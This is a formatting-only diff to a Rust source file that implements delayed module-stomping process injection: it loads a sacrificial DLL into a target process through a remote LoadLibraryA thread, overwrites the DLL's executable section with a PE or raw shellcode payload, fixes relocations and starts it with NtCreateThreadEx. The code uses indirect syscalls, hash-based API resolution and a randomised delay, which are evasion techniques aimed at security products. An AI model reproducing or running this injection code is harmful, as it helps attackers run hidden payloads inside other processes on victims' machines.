@@ -283,9 +283,7 @@ struct ModuleInfo {
 ///
 /// The initial enumeration's only purpose is to pick a sacrificial DLL name
 /// that is *not* currently loaded — stale data there is harmless.
-unsafe fn enumerate_remote_modules(
-    process_handle: *mut c_void,
-) -> Result<Vec<ModuleInfo>> {
+unsafe fn enumerate_remote_modules(process_handle: *mut c_void) -> Result<Vec<ModuleInfo>> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
         .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
@@ -416,15 +414,21 @@ unsafe fn enumerate_remote_modules(
         read_buf(entry_addr + 0x58, &mut name_buf)?;
         let name_len = u16::from_le_bytes([name_buf[0], name_buf[1]]) as usize;
         let name_buffer_ptr = usize::from_le_bytes([
-            name_buf[4], name_buf[5], name_buf[6], name_buf[7],
-            name_buf[8], name_buf[9], name_buf[10], name_buf[11],
+            name_buf[4],
+            name_buf[5],
+            name_buf[6],
+            name_buf[7],
+            name_buf[8],
+            name_buf[9],
+            name_buf[10],
+            name_buf[11],
         ]);
 
         let mut name_utf16 = vec![0u16; name_len / 2];
-        read_buf(name_buffer_ptr, std::slice::from_raw_parts_mut(
-            name_utf16.as_mut_ptr() as *mut u8,
-            name_len,
-        ))?;
+        read_buf(
+            name_buffer_ptr,
+            std::slice::from_raw_parts_mut(name_utf16.as_mut_ptr() as *mut u8, name_len),
+        )?;
 
         let name = String::from_utf16_lossy(&name_utf16);
 
@@ -483,24 +487,17 @@ fn is_excluded(dll_name: &str) -> bool {
 
 /// Load a DLL into the target process via `LoadLibraryA` through a remote
 /// thread. Uses indirect syscalls throughout.
-unsafe fn load_dll_remote(
-    process_handle: *mut c_void,
-    dll_path: &str,
-) -> Result<()> {
+unsafe fn load_dll_remote(process_handle: *mut c_void, dll_path: &str) -> Result<()> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
         .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
     // Resolve kernel32!LoadLibraryA
-    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
-        b"kernel32.dll\0",
-    ))
-    .ok_or_else(|| anyhow!("cannot resolve kernel32"))?;
+    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
+        .ok_or_else(|| anyhow!("cannot resolve kernel32"))?;
 
-    let load_library_a = pe_resolve::get_proc_address_by_hash(
-        kernel32,
-        pe_resolve::hash_str(b"LoadLibraryA\0"),
-    )
-    .ok_or_else(|| anyhow!("cannot resolve LoadLibraryA"))?;
+    let load_library_a =
+        pe_resolve::get_proc_address_by_hash(kernel32, pe_resolve::hash_str(b"LoadLibraryA\0"))
+            .ok_or_else(|| anyhow!("cannot resolve LoadLibraryA"))?;
 
     // Allocate memory for DLL path in target
     let alloc_target = crate::syscalls::get_syscall_id("NtAllocateVirtualMemory").ok();
@@ -521,14 +518,16 @@ unsafe fn load_dll_remote(
         &[
             process_handle as u64,
             &mut base_addr as *mut usize as u64,
-            0,                // ZeroBits
+            0, // ZeroBits
             &mut region_size as *mut usize as u64,
             MEM_COMMIT as u64 | MEM_RESERVE as u64,
             PAGE_READWRITE as u64,
         ],
     );
     if status < 0 {
-        return Err(anyhow!("NtAllocateVirtualMemory for DLL path failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtAllocateVirtualMemory for DLL path failed: {status:#x}"
+        ));
     }
 
     // Write DLL path to target
@@ -546,7 +545,9 @@ unsafe fn load_dll_remote(
         ],
     );
     if status < 0 {
-        return Err(anyhow!("NtWriteVirtualMemory for DLL path failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtWriteVirtualMemory for DLL path failed: {status:#x}"
+        ));
     }
 
     // Create remote thread to call LoadLibraryA(path)
@@ -562,16 +563,16 @@ unsafe fn load_dll_remote(
         thread_tgt.gadget_addr,
         &[
             &mut thread_handle as *mut usize as u64, // ThreadHandle
-            THREAD_INJECT_ACCESS,                        // DesiredAccess (minimal thread access)
-            0,                                         // ObjectAttributes
-            process_handle as u64,                     // ProcessHandle
-            load_library_a as u64,                     // StartRoutine
-            base_addr as u64,                          // Argument (DLL path)
-            0,                                         // CreateSuspended
-            0,                                         // StackZeroBits
-            0,                                         // StackSize
-            0,                                         // MaximumStackSize
-            0,                                         // AttributeList
+            THREAD_INJECT_ACCESS,                    // DesiredAccess (minimal thread access)
+            0,                                       // ObjectAttributes
+            process_handle as u64,                   // ProcessHandle
+            load_library_a as u64,                   // StartRoutine
+            base_addr as u64,                        // Argument (DLL path)
+            0,                                       // CreateSuspended
+            0,                                       // StackZeroBits
+            0,                                       // StackSize
+            0,                                       // MaximumStackSize
+            0,                                       // AttributeList
         ],
     );
     if status < 0 {
@@ -593,7 +594,9 @@ unsafe fn load_dll_remote(
                 ],
             );
         }
-        return Err(anyhow!("NtCreateThreadEx for LoadLibraryA failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtCreateThreadEx for LoadLibraryA failed: {status:#x}"
+        ));
     }
 
     // Wait for the remote thread to complete (LoadLibraryA returns)
@@ -605,7 +608,7 @@ unsafe fn load_dll_remote(
             &[
                 thread_handle as u64, // Handle
                 0,                    // Alertable (FALSE)
-                (-1i64) as u64,      // Timeout (INFINITE = -1 as signed i64)
+                (-1i64) as u64,       // Timeout (INFINITE = -1 as signed i64)
             ],
         );
     } else {
@@ -676,9 +679,7 @@ unsafe fn find_text_section(
         read_remote_memory(process_handle, sec_addr, &mut section)?;
 
         // Look for the first executable section (.text or similar)
-        if section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0
-            && section.virtual_size > 0
-        {
+        if section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section.virtual_size > 0 {
             let va = dll_base + section.virtual_address as usize;
             let size = section.virtual_size as usize;
             return Ok((va, size));
@@ -718,10 +719,7 @@ unsafe fn read_remote_memory<T>(
 }
 
 /// Read the PE entry point from the loaded DLL.
-unsafe fn read_entry_point(
-    process_handle: *mut c_void,
-    dll_base: usize,
-) -> Result<u32> {
+unsafe fn read_entry_point(process_handle: *mut c_void, dll_base: usize) -> Result<u32> {
     let mut dos_header = std::mem::zeroed::<ImageDosHeader>();
     read_remote_memory(process_handle, dll_base, &mut dos_header)?;
 
@@ -811,11 +809,7 @@ unsafe fn stomp_text_section(
         let flush_status = do_syscall(
             flush_tgt.ssn,
             flush_tgt.gadget_addr,
-            &[
-                process_handle as u64,
-                text_va as u64,
-                payload.len() as u64,
-            ],
+            &[process_handle as u64, text_va as u64, payload.len() as u64],
         );
         if flush_status < 0 {
             log::warn!(
@@ -871,9 +865,7 @@ unsafe fn fix_relocations(
     if nt_offset.saturating_add(std::mem::size_of::<ImageNtHeaders64>()) > payload.len() {
         return Ok(0);
     }
-    let nt = std::ptr::read_unaligned(
-        payload.as_ptr().add(nt_offset) as *const ImageNtHeaders64,
-    );
+    let nt = std::ptr::read_unaligned(payload.as_ptr().add(nt_offset) as *const ImageNtHeaders64);
     if nt.signature != 0x4550 {
         return Ok(0);
     }
@@ -932,10 +924,7 @@ unsafe fn fix_relocations(
             if entry_offset + 2 > payload.len() {
                 break;
             }
-            let entry = u16::from_le_bytes([
-                payload[entry_offset],
-                payload[entry_offset + 1],
-            ]);
+            let entry = u16::from_le_bytes([payload[entry_offset], payload[entry_offset + 1]]);
             let typ = entry >> 12;
             let rva_offset = (entry & 0x0FFF) as usize;
 
@@ -991,10 +980,7 @@ unsafe fn fix_relocations(
 // ── Execution ────────────────────────────────────────────────────────────────
 
 /// Execute the payload by creating a remote thread at the stomped address.
-unsafe fn execute_payload(
-    process_handle: *mut c_void,
-    entry_address: usize,
-) -> Result<usize> {
+unsafe fn execute_payload(process_handle: *mut c_void, entry_address: usize) -> Result<usize> {
     let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx").ok();
     let thread_tgt = thread_target
         .as_ref()
@@ -1006,16 +992,16 @@ unsafe fn execute_payload(
         thread_tgt.gadget_addr,
         &[
             &mut thread_handle as *mut usize as u64,
-            THREAD_INJECT_ACCESS,  // minimal thread access
-            0,                      // ObjectAttributes
+            THREAD_INJECT_ACCESS, // minimal thread access
+            0,                    // ObjectAttributes
             process_handle as u64,
-            entry_address as u64,   // StartRoutine
-            0,                      // Argument
-            0,                      // CreateSuspended = FALSE
-            0,                      // StackZeroBits
-            0,                      // StackSize
-            0,                      // MaximumStackSize
-            0,                      // AttributeList
+            entry_address as u64, // StartRoutine
+            0,                    // Argument
+            0,                    // CreateSuspended = FALSE
+            0,                    // StackZeroBits
+            0,                    // StackSize
+            0,                    // MaximumStackSize
+            0,                    // AttributeList
         ],
     );
     if status < 0 {
@@ -1027,10 +1013,7 @@ unsafe fn execute_payload(
 
 /// Alternative execution via callback injection pattern.
 /// Uses `EnumSystemLocalesA` with the stomped address as callback.
-unsafe fn execute_via_callback(
-    process_handle: *mut c_void,
-    entry_address: usize,
-) -> Result<usize> {
+unsafe fn execute_via_callback(process_handle: *mut c_void, entry_address: usize) -> Result<usize> {
     // Resolve kernel32!EnumSystemLocalesA in target
     // For simplicity, use NtCreateThreadEx — callback injection is
     // available as a future enhancement via the existing callback
@@ -1103,11 +1086,10 @@ pub unsafe fn phase1_load(
     // non-standard Windows installations (e.g. D:\Windows).
     let system_dir = {
         let mut buf = [0u16; 260];
-        let kernel32 = pe_resolve::get_module_handle_by_hash(
-            pe_resolve::hash_str(b"kernel32.dll\0"),
-        );
-        let get_sys_dir: Option<unsafe extern "system" fn(*mut u16, u32) -> u32> =
-            kernel32.and_then(|base| {
+        let kernel32 =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"));
+        let get_sys_dir: Option<unsafe extern "system" fn(*mut u16, u32) -> u32> = kernel32
+            .and_then(|base| {
                 pe_resolve::get_proc_address_by_hash(
                     base,
                     pe_resolve::hash_str(b"GetSystemDirectoryW\0"),
@@ -1148,19 +1130,14 @@ pub unsafe fn phase1_load(
         .ok_or_else(|| anyhow!("DLL {} not found after loading", dll_name))?;
 
     let dll_base = dll_module.base;
-    log::info!(
-        "[delayed-stomp] DLL {} base: {:#x}",
-        dll_name,
-        dll_base
-    );
+    log::info!("[delayed-stomp] DLL {} base: {:#x}", dll_name, dll_base);
 
     // Find .text section
     let (text_va, text_size) = find_text_section(process_handle as *mut c_void, dll_base)
         .with_context(|| "failed to find .text section")?;
 
     // Read entry point (before stomp)
-    let entry_rva = read_entry_point(process_handle as *mut c_void, dll_base)
-        .unwrap_or(0);
+    let entry_rva = read_entry_point(process_handle as *mut c_void, dll_base).unwrap_or(0);
 
     // Determine if payload is a PE
     let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
@@ -1196,9 +1173,7 @@ pub unsafe fn phase1_load(
 /// Phase 2 of delayed stomp: overwrite .text section and execute payload.
 ///
 /// This is called after the delay has elapsed.
-pub unsafe fn phase2_stomp_and_execute(
-    pending: &PendingStomp,
-) -> Result<InjectionHandle> {
+pub unsafe fn phase2_stomp_and_execute(pending: &PendingStomp) -> Result<InjectionHandle> {
     let process_handle = pending.process_handle as *mut c_void;
 
     log::info!(
@@ -1220,18 +1195,15 @@ pub unsafe fn phase2_stomp_and_execute(
     // Determine entry point
     let entry_address = if pending.is_pe {
         // Fix relocations and get entry point
-        let ep_rva = fix_relocations(process_handle, pending.dll_base, &pending.payload)
-            .unwrap_or(0);
+        let ep_rva =
+            fix_relocations(process_handle, pending.dll_base, &pending.payload).unwrap_or(0);
         pending.dll_base + ep_rva as usize
     } else {
         // Raw shellcode: entry = start of .text section
         pending.text_section_va
     };
 
-    log::info!(
-        "[delayed-stomp] Entry point: {:#x}",
-        entry_address
-    );
+    log::info!("[delayed-stomp] Entry point: {:#x}", entry_address);
 
     // Execute
     let thread_handle = execute_payload(process_handle, entry_address)
@@ -1307,10 +1279,7 @@ pub fn inject_delayed_stomp_async(
     std::thread::Builder::new()
         .name("delayed-stomp-phase2".into())
         .spawn(move || {
-            log::info!(
-                "[delayed-stomp] Phase 2 thread: waiting {}s...",
-                delay_secs
-            );
+            log::info!("[delayed-stomp] Phase 2 thread: waiting {}s...", delay_secs);
             std::thread::sleep(std::time::Duration::from_secs(delay_secs as u64));
 
             match unsafe { phase2_stomp_and_execute(&pending) } {
@@ -1383,13 +1352,11 @@ mod tests {
 
     #[test]
     fn test_dll_selection_all_loaded() {
-        let modules = vec![
-            ModuleInfo {
-                base: 0x70000000,
-                size: 0x10000,
-                name: "version.dll".into(),
-            },
-        ];
+        let modules = vec![ModuleInfo {
+            base: 0x70000000,
+            size: 0x10000,
+            name: "version.dll".into(),
+        }];
         let candidates = vec!["version.dll".into()];
         let selected = select_sacrificial_dll(&modules, &candidates);
         assert!(selected.is_none());
@@ -1416,7 +1383,13 @@ mod tests {
             let max = 15u32;
             let range = max - min;
             let delay = min + (now.wrapping_mul(1103515245).wrapping_add(12345) % range);
-            assert!(delay >= min && delay <= max, "delay {} not in [{},{}]", delay, min, max);
+            assert!(
+                delay >= min && delay <= max,
+                "delay {} not in [{},{}]",
+                delay,
+                min,
+                max
+            );
         }
     }
 
@@ -1447,9 +1420,7 @@ mod tests {
         assert!(pe_payload.len() >= 2 && pe_payload[0] == b'M' && pe_payload[1] == b'Z');
 
         let shellcode = vec![0x48, 0x31, 0xC0, 0xC3];
-        assert!(
-            !(shellcode.len() >= 2 && shellcode[0] == b'M' && shellcode[1] == b'Z')
-        );
+        assert!(!(shellcode.len() >= 2 && shellcode[0] == b'M' && shellcode[1] == b'Z'));
     }
 
     #[test]
